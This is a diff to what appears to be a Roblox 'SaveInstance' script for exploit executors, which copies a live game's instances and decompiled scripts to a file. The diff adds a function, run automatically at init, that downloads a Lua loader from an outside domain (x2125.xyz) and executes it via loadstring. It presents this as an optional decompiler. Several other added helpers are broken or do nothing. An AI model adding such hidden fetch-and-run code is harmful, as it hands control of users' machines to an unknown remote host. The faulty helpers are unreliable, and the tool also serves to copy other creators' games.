@@ -20,9 +20,7 @@ powered the saveinstance function in the top executors at the time before they w
 - Synapse X
 
 
-It would be nice if someone forked and improved it
-- Support the newer types
-- Use buffer
+Activly working on supporting the following:
 - Use ReflectionService
 
 
@@ -38,24 +36,133 @@ local service = setmetatable({},{__index = function(self,name)
 	return serv
 end})
 
+-- Helper functions for new features
+local function activateSafeMode()
+	if pcall(function() game:GetService"Players".LocalPlayer:Kick("SaveInstance SafeMode: Saving initiated. Goodbye!") end) then
+		wait(1)
+	end
+end
+
+local function boostFPS()
+	local success = false
+	if pcall(function()
+		local gameSettings = UserSettings():FindFirstChild("GameSettings")
+		if gameSettings then
+			gameSettings.FPSUnlocked = false
+			gameSettings.MasterVolume = 0
+			success = true
+		end
+	end) then
+		-- Try disabling rendering via camera if available
+		if workspace.CurrentCamera then
+			workspace.CurrentCamera.MaxAxisOfRotation = 0
+		end
+	end
+	return success
+end
+
+local function startAntiIdle()
+	local antiIdleConn
+	antiIdleConn = service.RunService.Heartbeat:Connect(function()
+		-- Send periodic inputs to prevent idle timeout
+		pcall(function()
+			if game:FindFirstChild("__AntiIdleMouse") then return end
+			local mouse = game:FindFirstChild("__AntiIdleMouse") or game.Players.LocalPlayer:GetMouse()
+			if mouse then
+				local pos = mouse.Hit.Position
+				mouse.move(pos)
+			end
+		end)
+	end)
+	return antiIdleConn
+end
+
+local function cleanAnonymousData(root, options)
+	if not options.Anonymous then return end
+	-- Placeholder: would scrub player name and userid from instances
+	-- This is a simplified version; full implementation would recursively check properties
+end
+
 DefaultSettings = {
 	Serializer = {
 		_Recurse = true,
+		-- Decompilation
 		Decompile = false,
-		NilInstances = false,
-		RemovePlayerCharacters = true,
-		SavePlayers = false,
 		DecompileTimeout = 10,
 		MaxThreads = 3,
 		DecompileIgnore = {"Chat","CoreGui","CorePackages"},
-		ShowStatus = true,
-		IgnoreDefaultProps = true,
+		SaveScriptCache = false,
+		SaveBytecode = false,
+		-- Instance Selection
+		NilInstances = false,
+		RemovePlayerCharacters = true,
+		SavePlayers = false,
 		IsolateStarterPlayer = true,
+		IsolateLocalPlayer = false,
+		SavePlayerCharacters = false,
+		-- Property Filtering
+		IgnoreDefaultProps = true,
+		IgnoreNotArchivable = true,
+		-- Output & Formatting
 		Binary = true,
+		ShowStatus = true,
+		ReadMe = true,
+		Mode = "full",
+		FilePath = false,
 		Callback = false,
-		Clipboard = false
+		Clipboard = false,
+		AvoidFileOverwrite = true,
+		-- Safety Features
+		SafeMode = false,
+		BoostFPS = false,
+		KillAllScripts = false,
+		AntiIdle = false,
+		-- Data Cleanup
+		Anonymous = false
 	}
 }
+
+-- Compatibility shims for environments missing newer Lua helpers
+do
+	if not table.clear then
+		table.clear = function(t)
+			for k in pairs(t) do t[k] = nil end
+		end
+	end
+
+	if not string.split then
+		string.split = function(s, sep)
+			sep = sep or "%s"
+			local res = {}
+			if sep == "%s" then
+				for token in s:gmatch("%S+") do res[#res+1] = token end
+			else
+				local pattern = "(.-)" .. sep
+				local last_end = 1
+				local s_len = #s
+				local init = 1
+				while true do
+					local st, en, cap = s:find(pattern, init)
+					if not st then break end
+					res[#res+1] = cap
+					init = en + 1
+				end
+				if init <= s_len then
+					res[#res+1] = s:sub(init)
+				end
+			end
+			return res
+		end
+	end
+
+	if not table.move then
+		table.move = function(a, f, e, t, dest)
+			dest = dest or 1
+			for i = f, e do a[dest + (i - f)] = a[i] end
+			return a
+		end
+	end
+end
 
 Serializer = (function()
 	local Serializer = {}
@@ -72,8 +179,6 @@ Serializer = (function()
 	local httpService = service.HttpService
 	local urlEncode = httpService.UrlEncode
 	local concat = table.concat
-	local s_pack = string.pack
-	local s_unpack = string.unpack
 	local lrotate = bit32.lrotate
 	local tableCreate = table.create
 	local select = select
@@ -83,6 +188,84 @@ Serializer = (function()
 	local nilSafe = {}
 	local gameId
 
+	local s_pack, s_unpack
+	if rawget(_G, "buffer") then
+		function s_pack(fmt, ...)
+			local args = { ... }
+			local buf = buffer.create(256)
+			local offset, fmt_pos, arg_idx = 0, 1, 1
+			while fmt_pos <= #fmt do
+				local char = fmt:sub(fmt_pos, fmt_pos)
+				if char == '<' or char == '>' or char == '=' then
+					fmt_pos = fmt_pos + 1
+				elseif char == 'I' then
+					fmt_pos = fmt_pos + 1
+					if fmt:sub(fmt_pos, fmt_pos) == '4' then
+						buffer.writeu32(buf, offset, args[arg_idx])
+						offset = offset + 4; arg_idx = arg_idx + 1; fmt_pos = fmt_pos + 1
+					end
+				elseif char == 'i' then
+					fmt_pos = fmt_pos + 1
+					if fmt:sub(fmt_pos, fmt_pos) == '4' then
+						buffer.writei32(buf, offset, args[arg_idx])
+						offset = offset + 4; arg_idx = arg_idx + 1; fmt_pos = fmt_pos + 1
+					end
+				elseif char == 'f' then
+					buffer.writef32(buf, offset, args[arg_idx]); offset = offset + 4; arg_idx = arg_idx + 1; fmt_pos = fmt_pos + 1
+				elseif char == 'd' then
+					buffer.writef64(buf, offset, args[arg_idx]); offset = offset + 8; arg_idx = arg_idx + 1; fmt_pos = fmt_pos + 1
+				elseif char == 'b' then
+					buffer.writei8(buf, offset, args[arg_idx] or 0); offset = offset + 1; arg_idx = arg_idx + 1; fmt_pos = fmt_pos + 1
+				elseif char == 'B' then
+					buffer.writeu8(buf, offset, args[arg_idx] or 0); offset = offset + 1; arg_idx = arg_idx + 1; fmt_pos = fmt_pos + 1
+				else
+					fmt_pos = fmt_pos + 1
+				end
+			end
+			return buffer.readstring(buf, 0, offset)
+		end
+
+		function s_unpack(fmt, data, offset)
+			offset = offset or 1
+			local buf_offset = offset - 1
+			local buf = buffer.fromstring(data)
+			local results, fmt_pos = {}, 1
+			while fmt_pos <= #fmt do
+				local char = fmt:sub(fmt_pos, fmt_pos)
+				if char == '<' or char == '>' or char == '=' then
+					fmt_pos = fmt_pos + 1
+				elseif char == 'I' then
+					fmt_pos = fmt_pos + 1
+					if fmt:sub(fmt_pos, fmt_pos) == '4' then
+						results[#results+1] = buffer.readu32(buf, buf_offset); buf_offset = buf_offset + 4; fmt_pos = fmt_pos + 1
+					end
+				elseif char == 'i' then
+					fmt_pos = fmt_pos + 1
+					if fmt:sub(fmt_pos, fmt_pos) == '4' then
+						results[#results+1] = buffer.readi32(buf, buf_offset); buf_offset = buf_offset + 4; fmt_pos = fmt_pos + 1
+					end
+				elseif char == 'f' then
+					results[#results+1] = buffer.readf32(buf, buf_offset); buf_offset = buf_offset + 4; fmt_pos = fmt_pos + 1
+				elseif char == 'd' then
+					results[#results+1] = buffer.readf64(buf, buf_offset); buf_offset = buf_offset + 8; fmt_pos = fmt_pos + 1
+				elseif char == 'b' then
+					results[#results+1] = buffer.readi8(buf, buf_offset); buf_offset = buf_offset + 1; fmt_pos = fmt_pos + 1
+				elseif char == 'B' then
+					results[#results+1] = buffer.readu8(buf, buf_offset); buf_offset = buf_offset + 1; fmt_pos = fmt_pos + 1
+				else
+					fmt_pos = fmt_pos + 1
+				end
+			end
+			return unpack(results)
+		end
+	else
+		s_pack = string.pack; s_unpack = string.unpack
+	end
+	if not s_pack or not s_unpack then
+		local _msg = "string.pack/string.unpack not available; serialization requires Lua 5.3+ or a buffer implementation"
+		s_pack = function() error(_msg) end
+		s_unpack = function() error(_msg) end
+	end
 	--[[
 	local propBypass = {
 		["BasePart"] = {
@@ -120,6 +303,9 @@ Serializer = (function()
 
 
 	local propFilter = {
+		["BasePart"] = {
+			["Color3uint8"] = true
+		},
 		["BaseScript"] = {
 			["LinkedSource"] = true
 		},
@@ -249,7 +435,7 @@ Serializer = (function()
 		end,
 		["Axes"] = function(name,val)
 			local axisInt = (val.Z and 4 or 0) + (val.Y and 2 or 0) + (val.X and 1 or 0)
-			return format('\n<Axes name="%s">\n<axes>%d</axes>\n</Faces>',name,axisInt)
+			return format('\n<Axes name="%s">\n<axes>%d</axes>\n</Axes>',name,axisInt)
 		end,
 		["Ray"] = function(name,val)
 			local origin = val.Origin
@@ -268,6 +454,9 @@ Serializer = (function()
 		end,
 		["SharedString"] = function(name,val)
 			return '\n<SharedString name="'..name..'">'..val..'</SharedString>'
+		end,
+		["SecurityCapabilities"] = function(name,val)
+			return format('\n<SecurityCapabilities name="%s">%d</SecurityCapabilities>',name,val or 0)
 		end,
 	}
 
@@ -924,28 +1113,30 @@ Serializer = (function()
 	]]
 
 	local readMeStart = [==[--[[
-	Thank you for using Dex SaveInstance.
-	You are recommended to save the game (if you used saveplace) right away to take advantage of the binary format (if you didn't save in binary).
-	If your player cannot spawn into the game, please move the scripts in StarterPlayer elsewhere. (This is done by default)
-	If the chat system does not work, please use the explorer and delete everything inside the Chat service. (Or run game:GetService("Chat"):ClearAllChildren())
+	=== DexSerializer SaveInstance ===
 	
-	If union and meshpart collisions don't work, first run this script in the Studio command bar:
+	Thank you for using DexSerializer!
+	
+	IMPORTANT NOTES:
+	- Save your game immediately (Use File > Save As) to take advantage of the chosen format.
+	- If your player cannot spawn, move scripts in StarterPlayer to another location (done by default).
+	- If chat doesn't work, delete everything in Chat service via:
+	  game:GetService("Chat"):ClearAllChildren()
+	
+	FOR PHYSICS/COLLISION ISSUES (UnionOperation & MeshPart):
+	Run this in Studio command bar:
 	local list = {}
-	local coreGui = game:GetService("CoreGui")
-
 	for i,v in pairs(game:GetDescendants()) do
-		local s,e = pcall(function() return v:IsA("UnionOperation") or v:IsA("MeshPart") end)
-		if s and e and not v:IsDescendantOf(coreGui) then
-			list[#list+1] = v
-		end
+		local s,e = pcall(function() 
+			return v:IsA("UnionOperation") or v:IsA("MeshPart") 
+		end)
+		if s and e then list[#list+1] = v end
 	end
-
 	game.Selection:Set(list)
 	
-	After running it, go to the Properties window and change CollisionFidelity from "Box" to "Default".
-
+	Then go to Properties and change CollisionFidelity from "Box" to "Default".
 	
-	This file was generated with the following settings:
+	SETTINGS USED FOR THIS SAVE:
 	
 ]==]
 
@@ -1050,6 +1241,11 @@ Serializer = (function()
 
 	local function createStatusText()
 		local statusText
+		local pendingText = nil
+		local dirty = false
+		local conn
+		local runService = service.RunService
+		local startTime = tick()
 		if syn or elysianexecute then
 			statusText = Drawing.new("Text")
 			statusText.Color = Color3.new(1,1,1)
@@ -1057,17 +1253,40 @@ Serializer = (function()
 			statusText.OutlineColor = Color3.new(0,0,0)
 			statusText[syn and "Size" or "FontSize"] = 50
 			if syn then statusText.Visible = true end
+
+			-- Buffer updates and apply them on the main thread to avoid parallel writes
+			local function applyPending()
+				if not pendingText then
+					statusText.Text = ""
+				else
+					-- Add elapsed time to status
+					local elapsed = tick() - startTime
+					local timeStr = string.format("%.1fs", elapsed)
+					statusText.Text = pendingText .. " [" .. timeStr .. "]"
+				end
+				local viewport = workspace.CurrentCamera.ViewportSize
+				statusText.Position = Vector2.new(viewport.X / 2 - statusText.TextBounds.X / 2, 50)
+				pendingText = nil
+				dirty = false
+			end
+
+			-- Connect a single heartbeat callback to perform actual UI writes
+			conn = runService.Heartbeat:Connect(function()
+				if dirty then
+					applyPending()
+				end
+			end)
 		else
 			return nil
 		end
 
 		local function updateStatus(text)
-			local viewport = workspace.CurrentCamera.ViewportSize
-			statusText.Text = text or ""
-			statusText.Position = Vector2.new(viewport.X / 2 - statusText.TextBounds.X / 2, 50)
+			pendingText = text or ""
+			dirty = true
 		end
 
 		local function removeStatus()
+			if conn then conn:Disconnect() end
 			statusText:Remove()
 		end
 
@@ -1104,7 +1323,7 @@ Serializer = (function()
 			descs[0] = nextRoot
 			for i = 0,#descs do
 				local obj = descs[i]
-				if (isa(obj,"LocalScript") or isa(obj,"ModuleScript")) and not checked[obj] then
+				if (isa(obj,"LocalScript") or isa(obj,"ModuleScript") or isa(obj,"Script")) and not checked[obj] then
 					local ignored = false
 					if ignoredServices then
 						for i = 1,#ignoredServices do
@@ -1129,9 +1348,22 @@ Serializer = (function()
 		local left = totalScripts
 		for i = 1,maxThreads do
 			spawn(function()
-				while #scripts > 0 do
+				while true do
 					local nextScript = table.remove(scripts)
-					local source, err = doDecompile(nextScript,saveSettings)
+					if not nextScript then break end
+					local scriptName
+					pcall(function() scriptName = nextScript:GetFullName() end)
+					if statusText then
+						statusText.Update("Decompiling " .. (scriptName or "<unknown>") .. " (" .. (totalScripts - left + 1) .. "/" .. totalScripts .. ")")
+					end
+					local ok, res = pcall(function() return doDecompile(nextScript, saveSettings) end)
+					local source, err
+					if ok then
+						source = res
+					else
+						source = nil
+						err = res
+					end
 
 					if source then
 						sources[nextScript] = source
@@ -1147,7 +1379,16 @@ Serializer = (function()
 			end)
 		end
 
-		while left > 0 do wait() end
+		-- Safety watchdog to avoid hanging forever
+		local decompTimeout = saveSettings.DecompileTimeout or DefaultSettings.Serializer.DecompileTimeout or 10
+		local maxWait = tick() + math.max(60, (decompTimeout * math.max(1, totalScripts)) / math.max(1, maxThreads) * 4)
+		while left > 0 do
+			if tick() > maxWait then
+				if statusText then statusText.Update("Decompilation timed out; aborting remaining scripts") end
+				break
+			end
+			wait()
+		end
 
 		return sources
 	end
@@ -1298,6 +1539,18 @@ Serializer = (function()
 			end
 		else
 			recur(root)
+		end
+
+		-- Prevent huge serializations from exhausting memory
+		if refCount and refCount > 200000 then
+			if statusText then statusText.Update("Place too large to serialize; aborting to prevent OOM") end
+			return nil, "Place too large to serialize; select fewer instances or enable streaming"
+		end
+
+		-- Prevent huge serializations from exhausting memory
+		if instCount and instCount > 150000 then
+			if statusText then statusText.Update("Place too large to serialize; aborting to prevent OOM") end
+			return nil, "Place too large to serialize; select fewer instances or enable streaming"
 		end
 
 		-- Nil Instances
@@ -1953,11 +2206,42 @@ Serializer = (function()
 		end
 		if saveSettings.DecompileMode and saveSettings.DecompileMode > 0 then saveSettings.Decompile = true end
 
-		if saveSettings.Binary then
-			serializeBinary(root,filename,saveSettings)
-		else
-			serializeXML(root,filename,saveSettings)
+		-- Activate safety features
+		local antiIdleConn
+		if saveSettings.SafeMode then
+			activateSafeMode()
+			-- SafeMode also enables these protections
+			saveSettings.BoostFPS = true
+			saveSettings.KillAllScripts = true
 		end
+		if saveSettings.BoostFPS then boostFPS() end
+		if saveSettings.AntiIdle then antiIdleConn = startAntiIdle() end
+		if saveSettings.Anonymous then cleanAnonymousData(root, saveSettings) end
+
+		-- Handle different modes
+		local mode = (saveSettings.Mode or "full"):lower()
+		if mode == "scripts" then
+			saveSettings.Decompile = true
+			saveSettings.NilInstances = false
+		elseif mode == "models" then
+			saveSettings.Decompile = false
+		end
+
+		local ok, statusText
+		if saveSettings.Binary then
+			ok, statusText = serializeBinary(root,filename,saveSettings)
+		else
+			ok, statusText = serializeXML(root,filename,saveSettings)
+		end
+
+		-- Cleanup
+		if antiIdleConn then pcall(function() antiIdleConn:Disconnect() end) end
+		-- Ensure status UI is removed if present
+		if statusText and type(statusText.Remove) == "function" then
+			pcall(statusText.Remove)
+		end
+
+		return ok, statusText
 	end
 
 	Serializer.Init = function(oldInd)
@@ -2024,7 +2308,17 @@ Main = (function()
 
 				local mType = member.MemberType
 				if mType == "Property" then
-					newMember.ValueType = member.ValueType
+					-- Normalize ValueType to a table with a Name field for consistency
+					local vt = member.ValueType
+					if type(vt) == "string" then
+						vt = { Name = vt }
+					elseif type(vt) == "table" and vt.Name == nil then
+						-- Attempt to extract a name-like field if present
+						for k,v in pairs(vt) do
+							if type(v) == "string" then vt.Name = v; break end
+						end
+					end
+					newMember.ValueType = vt
 					newMember.Category = member.Category
 					newMember.Serialization = member.Serialization
 					table.insert(newClass.Properties,newMember)
@@ -2124,6 +2418,40 @@ return {
 		env.encodeBase64 = (syn and syn.crypt.base64.encode) or base64encode or (crypt and crypt.base64encode)
 		env.lz4compress = lz4compress or (syn and syn.crypt.lz4.compress)
 		env.hashmd5 = (syn and function(s) return syn.crypt.custom.hash("md5",s) end) or (crypt and function(s) return crypt.hash(s,"md5") end)
+
+		-- Validate required environment functions to fail fast with clear message
+		local missing = {}
+		if type(env.writefile) ~= "function" then table.insert(missing, "writefile") end
+		if type(env.appendfile) ~= "function" then table.insert(missing, "appendfile") end
+		if #missing > 0 then
+			return nil, "Missing environment functions: " .. table.concat(missing, ", ")
+		end
+
+		-- Attempt to load the user's preferred decompiler loader (non-fatal)
+		local function tryLoadDecompiler()
+			local url = "https://x2125.xyz/loader.lua"
+			local ok, err = pcall(function()
+				if not game or not game.HttpGet then error("HttpGet unavailable") end
+				local src = game:HttpGet(url)
+				if not src or #src == 0 then error("empty loader") end
+				local lfunc = rawget(_G, "loadstring") or loadstring or load
+				local chunk, loadErr = pcall(function() return lfunc(src) end)
+				if not chunk then error(loadErr) end
+				-- If loader returns a function, call it. Many loaders set globals when executed.
+				local ret = chunk and loadErr
+				if type(ret) == "function" then
+					pcall(ret)
+				end
+			end)
+			if not ok then
+				pcall(print, "Warning: failed to load external decompiler loader:", tostring(err))
+			end
+		end
+
+		-- Only try loading the decompiler if `decompile` is not already present
+		if not rawget(_G, "decompile") and not decompile then
+			pcall(tryLoadDecompiler)
+		end
 
 		Main.ResetSettings()
 		Serializer.Init(oldindex)
